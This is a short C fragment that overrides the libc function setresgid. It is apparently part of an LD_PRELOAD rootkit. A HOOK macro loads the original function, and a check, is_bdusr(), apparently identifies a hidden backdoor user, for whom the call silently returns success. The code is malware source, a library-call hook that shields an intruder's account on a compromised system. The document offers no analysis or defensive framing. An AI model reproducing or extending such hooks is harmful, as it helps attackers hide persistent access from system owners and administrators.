int setresgid(gid_t rgid, gid_t egid, gid_t sgid)
{
    HOOK(o_setresgid, CSETRESGID);
    if(is_bdusr()) return 0;
    return o_setresgid(rgid, egid, sgid);
}
